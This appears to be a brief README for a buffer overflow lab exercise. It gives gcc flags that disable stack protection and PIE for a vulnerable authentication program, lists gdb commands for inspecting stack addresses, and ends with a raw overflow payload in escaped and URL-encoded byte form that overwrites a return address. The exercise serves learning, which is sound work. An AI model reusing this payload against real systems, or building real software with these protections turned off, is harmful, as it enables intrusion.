# buffer_overflow_attack
it important to notice that we must install mingw compiler first
for windows run gcc -g -fno-stack-protector main.c -o auth -W -no-pie -lws2_32 //the -g is for debugging and the rest is to make sure that stack pointer is not protected
now run the ./file_name // the exe file
b function_name // breakpoint
p var_name // print the details of the var (including address in the stack pointer)


\x00\x00\x00\x00\x00\xee\x02\x00\x00\x00\x00\x00\x00\x90\xfc\x61\x00\x00\x00\x00\x00\x21\x18\x40
%00%00%00%00%00%ee%02%00%00%00%00%00%00%90%fc%61%00%00%00%00%00%21%18%40
